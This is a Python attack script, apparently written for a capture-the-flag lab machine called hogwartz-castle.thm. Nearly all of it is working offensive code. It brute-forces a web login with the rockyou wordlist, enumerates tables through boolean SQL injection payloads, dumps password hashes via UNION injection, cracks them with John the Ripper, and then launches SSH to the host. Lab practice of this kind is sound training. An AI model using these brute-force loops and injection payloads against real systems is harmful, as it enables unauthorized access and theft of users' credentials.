#!/usr/bin/env python3




import requests,sys,colorama,os
from colorama import Fore


"""def login():
	try:
		url = "http://hogwartz-castle.thm/login"
		headers = {"User-Agent": "vuln72","Accept-Encoding": "gzip, deflate","Host": "hogwartz-castle.thm","Content-Type": "application/x-www-form-urlencoded"}
		with open("spellnames.txt", "r", encoding='latin-1') as file:
			passwords = file.readlines()
			stuff = [x.strip() for x in passwords]
			for word in stuff:
				username = "harry"
				data = f"user={username}&password={word}"
				r = requests.post(url, headers=headers, data=data, verify=False)
				print(Fore.RED + f"Trying: {username}:{word}")
				if "Incorrect Username or Password" not in r.text:
					print(Fore.YELLOW + f"Password Found: {word}")
	except:
		print(Fore.RED + "SomeThing Fucked Up!")"""				




"""def rockyou_login():
	try:
		url = "http://hogwartz-castle.thm/login"
		headers = {"User-Agent": "vuln72","Accept-Encoding": "gzip, deflate","Host": "hogwartz-castle.thm","Content-Type": "application/x-www-form-urlencoded"}
		with open("/opt/wordlists/rockyou.txt", "r", encoding='latin-1') as file:
			passwords = file.readlines()
			stuff = [x.strip() for x in passwords]
			with open("spellnames.txt", "r", encoding='latin-1') as file2:
				passwords2 = file2.readlines()
				stuff2 = [x.strip() for x in passwords2]
				for word in stuff:
					for words in stuff2:
						data = f"user={words}&password={word}"
						r = requests.post(url, headers=headers, data=data, verify=False)
						print(Fore.RED + f"Trying User And Password: {words}:{word}")
						if "Incorrect Username or Password" not in r.text:
							print(Fore.YELLOW + f"Login Set Found: {words}{word}")
							file.close()
							file2.close()
							break
	except:
		print(Fore.RED + "SomeThing Fucked Up!")"""						




def rock_login():
	try:
		url = "http://hogwartz-castle.thm/login"
		headers = {"User-Agent": "vuln72","Accept-Encoding": "gzip, deflate","Host": "hogwartz-castle.thm","Content-Type": "application/x-www-form-urlencoded"}
		with open("/opt/wordlists/rockyou.txt", "r", encoding='latin-1') as file:
			passwords = file.readlines()
			stuff = [x.strip() for x in passwords]
			for word in stuff:
				username = "Hagrid"
				data = f"user={username}&password={word}"
				r = requests.post(url, headers=headers, data=data, verify=False)
				print(Fore.RED + f"Trying: {username}:{word}")
				if "Incorrect Username or Password" not in r.text:
					print(Fore.YELLOW + f"Password Found: {word}")
					file.close()
					break
	except:
		print(Fore.RED + "SomeThing Fucked Up!")




def get_tables():
	try:
		url = "http://hogwartz-castle.thm/login"
		headers = {"User-Agent": "vuln72","Accept-Encoding": "gzip, deflate","Host": "hogwartz-castle.thm","Content-Type": "application/x-www-form-urlencoded"}
		with open("/usr/share/sqlmap/data/txt/common-tables.txt", "r", encoding='latin-1') as file:
			tables = file.readlines()
			stuff = [x.strip() for x in tables]
			for table in stuff:
				data = f"user=-8758' OR EXISTS(SELECT 1 FROM {table})-- RXLf&password='or 1=1-- -"
				r = requests.post(url, headers=headers, data=data, verify=False)
				print(Fore.RED + f"Trying Table: {table}")
				if r.status_code == 403:
					print(Fore.YELLOW + f"Found Database Table: {table}")
					s = input(Fore.YELLOW + "Do You Want To Continue Enumerating Y/N: ")
					if s == "Y":
						continue
					else:
						file.close()
						break	
	except:
		print(Fore.RED + "SomeThing Fucked Up!")				




def help():
	print(Fore.YELLOW + "OPTIONS: brute-login get-tables format-hashes crack-hashes union-cols get-hashes ssh-login")




def format_file_with_hashes():
	try:
		with open("hashes", "r", encoding='latin-1') as file:
			hashes = file.readlines()
			for word in hashes:
				print(Fore.YELLOW + word)
	except:
		print(Fore.RED + "SomeThing Fucked Up!")			




def crack_hashes():
	try:
		print(Fore.YELLOW + "Cracking Hashes :D")
		os.system("john hashes --wordlist=spellnames.txt --format=Raw-SHA512")
				
				
	except:
		print(Fore.RED + "SomeThing Fucked Up!")




def get_shit_i_dont_know():
	try:
		url = "http://hogwartz-castle.thm/login"
		headers = {"User-Agent": "vuln72","Accept-Encoding": "gzip, deflate","Host": "hogwartz-castle.thm","Content-Type": "application/x-www-form-urlencoded"}
		with open("/usr/share/sqlmap/data/txt/common-tables.txt", "r", encoding='latin-1') as file:
			passwords = file.readlines()
			for word in passwords:
				data = f"user=admin' union select group_concat({word}),2,3,4 FROM users-- -&password=admin"
				r = requests.post(url, headers=headers, data=data, verify=False)
				if r.status_code == 403:
					print(Fore.YELLOW + r.text)
					s = input(Fore.YELLOW + "Do You Wanna Keep Doing Shit Y/N: ")
					if s == "Y":
						continue
					else:
						break	
				else:
					print(Fore.RED + f"Trying Something: {word}")
	except:
		print(Fore.RED + "SomeThing Fucked Up!")					






def get_hashes():
	try:
		url = "http://hogwartz-castle.thm/login"
		headers = {"User-Agent": "vuln72","Accept-Encoding": "gzip, deflate","Host": "hogwartz-castle.thm","Content-Type": "application/x-www-form-urlencoded"}
		data = f"user=admin' union select group_concat(password),2,3,4 FROM users-- -&password=admin"
		r = requests.post(url, headers=headers, data=data, verify=False)
		if r.status_code == 403:
			print(Fore.YELLOW + r.text)
			print(Fore.RED + "Do A Find And Replace IN Sublime-text With The Commas")
		else:
			print(Fore.RED + "Some Hoe Messed With My Script!")
	except:
		print(Fore.RED + "Some Hoe Messed With My Script!")		



def ssh_login():
	try:
		print(Fore.YELLOW + "Fill In The Password You Found Hacking Stuff :D")
		os.system("ssh harry@castle.thm")
	except:
		print(Fore.RED + "Some Hoe Messed With My Script!")	



def __init__():
	try:
		if sys.argv[1] == "-h" or sys.argv[1] == "--help":
			help()
	
		if sys.argv[1] == "get-tables":
			get_tables()
		if sys.argv[1]	== "brute-login":
			rock_login()
		if sys.argv[1] == "format-hashes" or sys.argv[1] == "Format-Hashes":
			format_file_with_hashes()
		if sys.argv[1] == "crack-hashes" or sys.argv[1] == "Crack-Hashes":
			crack_hashes()
		if sys.argv[1] == "union-cols" or sys.argv[1] == "Union-Cols":
			get_shit_i_dont_know()
		if sys.argv[1] == "get-hashes" or sys.argv[1] == "Get-Hashes":
			get_hashes()
		if sys.argv[1] == "ssh-login" or sys.argv[1] == "Ssh-Login":
			ssh_login()	
		
	except:
		print(Fore.YELLOW + "Use --help or -h For The Help Menu")			



__init__()				




